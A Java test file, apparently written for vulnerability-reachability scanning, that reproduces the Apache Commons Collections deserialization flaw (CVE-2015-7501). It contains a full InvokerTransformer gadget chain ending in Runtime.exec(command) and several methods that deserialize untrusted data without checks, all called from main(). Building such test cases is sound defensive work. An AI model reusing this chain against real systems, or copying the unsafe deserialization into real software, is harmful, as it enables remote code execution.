package com.test.vulnerabilities;

/**
 * BDSA-2015-0001: Apache Commons Collections Deserialization RCE
 * CVE: CVE-2015-7501, CVE-2015-4852
 * @author vigneshd
 *
 * Vulnerability: Unsafe deserialization in Apache Commons Collections 3.x
 * allows remote code execution through crafted serialized objects using
 * InvokerTransformer gadget chains.
 *
 * Affected versions: commons-collections < 3.2.2
 * Fix: Upgrade to commons-collections 3.2.2+ or 4.1+
 */

import java.io.ObjectInputStream;
import java.io.ByteArrayInputStream;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.keyvalue.TiedMapEntry;

public class BDSA_2015_0001 {

    /**
     * EXPLOITABLE: Creates a malicious transformer chain using InvokerTransformer.
     * This demonstrates how the InvokerTransformer gadget enables RCE.
     */
    public Object createMaliciousInvokerTransformer(String command) {
        /* Vulnerable API: InvokerTransformer */
        Transformer[] transformers = new Transformer[] {
            /* Vulnerable API: ConstantTransformer */
            new ConstantTransformer(Runtime.class),
            /* Vulnerable API: InvokerTransformer */
            new InvokerTransformer("getMethod",
                new Class[] { String.class, Class[].class },
                new Object[] { "getRuntime", new Class[0] }),
            /* Vulnerable API: InvokerTransformer */
            new InvokerTransformer("invoke",
                new Class[] { Object.class, Object[].class },
                new Object[] { null, new Object[0] }),
            /* Vulnerable API: InvokerTransformer */
            new InvokerTransformer("exec",
                new Class[] { String.class },
                new Object[] { command })  // Arbitrary command execution
        };

        /* Vulnerable API: ChainedTransformer */
        Transformer chainedTransformer = new ChainedTransformer(transformers);

        // Wrap in LazyMap to trigger transformation on access
        Map<Object, Object> lazyMap = LazyMap.decorate(new HashMap<>(), chainedTransformer);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "trigger");

        return entry;
    }

    /**
     * EXPLOITABLE: Uses ChainedTransformer to chain multiple dangerous transformers.
     */
    public Transformer createChainedTransformer() {
        Transformer[] transformers = new Transformer[] {
            /* Vulnerable API: ConstantTransformer */
            new ConstantTransformer(Runtime.class),
            /* Vulnerable API: InvokerTransformer */
            new InvokerTransformer("getMethod",
                new Class[] { String.class, Class[].class },
                new Object[] { "getRuntime", new Class[0] })
        };

        /* Vulnerable API: ChainedTransformer */
        return new ChainedTransformer(transformers);
    }

    /**
     * EXPLOITABLE: Uses ConstantTransformer as first step in gadget chain.
     */
    public Transformer createConstantTransformer() {
        /* Vulnerable API: ConstantTransformer */
        return new ConstantTransformer(Runtime.class);
    }

    /**
     * EXPLOITABLE: Deserializes untrusted data containing malicious payload.
     * An attacker can send a crafted serialized object that executes arbitrary commands.
     *
     * Attack vector: Send base64-encoded ysoserial payload with CommonsCollections gadget
     */
    public Object deserializeUntrustedData(String base64Payload) throws Exception {
        byte[] serializedData = Base64.getDecoder().decode(base64Payload);

        // VULNERABLE: No validation of serialized data before deserialization
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(serializedData));
        return ois.readObject();  // RCE triggered here when malicious payload is deserialized
    }

    /**
     * EXPLOITABLE: Processes user-provided serialized session data.
     * Common in web applications that store session state in cookies or hidden fields.
     */
    public void processSessionData(byte[] sessionBytes) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(sessionBytes));
        Object session = ois.readObject();  // VULNERABLE: RCE if attacker controls session bytes

        // Process session...
    }

    /**
     * EXPLOITABLE: Directly instantiates InvokerTransformer for reflection-based method invocation.
     */
    public Object invokeMethodViaTransformer(Object input, String methodName) throws Exception {
        /* Vulnerable API: InvokerTransformer */
        InvokerTransformer transformer = new InvokerTransformer(
            methodName,
            new Class[0],
            new Object[0]
        );

        return transformer.transform(input);
    }

    /**
     * Method containing vulnerable patterns extracted from JSON embeddings
     */
    public void vulnerablePatternsFromJson() {
        try {
            // Pattern from document: Transformer transformer = new InvokerTransformer("methodName", new Class[] {String.class}, new Object[] {"value"});
            Transformer transformer = new InvokerTransformer("methodName", new Class[] {String.class}, new Object[] {"value"});

            // Pattern from document: CollectionUtils.transformedCollection(originalCollection, new InvokerTransformer("methodName", new Class[] {String.class}, new Object[] {"value"}));
            java.util.Collection originalCollection = new java.util.ArrayList();
            org.apache.commons.collections.CollectionUtils.transformedCollection(originalCollection, new InvokerTransformer("methodName", new Class[] {String.class}, new Object[] {"value"}));

            // Pattern from document: new InvokerTransformer("methodName", new Class[] {String.class}, new Object[] {"value"});
            new InvokerTransformer("methodName", new Class[] {String.class}, new Object[] {"value"});

            // Pattern from document: List<Object> list = new ArrayList<>();
            java.util.List<Object> list = new java.util.ArrayList<>();

            // Pattern from document: list.add(new InvokerTransformer("methodName", new Class[] {String.class}, new Object[] {"value"}));
            list.add(new InvokerTransformer("methodName", new Class[] {String.class}, new Object[] {"value"}));

            // Pattern from document: Map<Object, Object> map = new HashMap<>();
            java.util.Map<Object, Object> map = new java.util.HashMap<>();

            // Pattern from document: map.put("key", new InvokerTransformer("methodName", new Class[] {String.class}, new Object[] {"value"}));
            map.put("key", new InvokerTransformer("methodName", new Class[] {String.class}, new Object[] {"value"}));

            // Pattern from document: ObjectInputStream ois = new ObjectInputStream(new FileInputStream("serializedFile"));
            ObjectInputStream ois = new ObjectInputStream(new java.io.FileInputStream("serializedFile"));

            // Pattern from document: Object obj = ois.readObject();
            Object obj = ois.readObject();
        } catch (Exception e) {
            // Suppress exceptions
        }
    }

    /**
     * Sample code demonstrating reachability to all vulnerable APIs
     */
    public static void main(String[] args) {
        BDSA_2015_0001 instance = new BDSA_2015_0001();

        try {
            // Exercise vulnerable APIs
            /* Vulnerable API: InvokerTransformer */
            instance.createMaliciousInvokerTransformer("calc");

            /* Vulnerable API: ChainedTransformer */
            instance.createChainedTransformer();

            /* Vulnerable API: ConstantTransformer */
            instance.createConstantTransformer();

            instance.deserializeUntrustedData("dGVzdA==");
            instance.processSessionData(new byte[]{0, 1, 2, 3});
            instance.invokeMethodViaTransformer(new Object(), "toString");

            // Call vulnerable patterns from JSON
            instance.vulnerablePatternsFromJson();
        } catch (Exception e) {
            // Suppress exceptions for testing
        }
    }
}
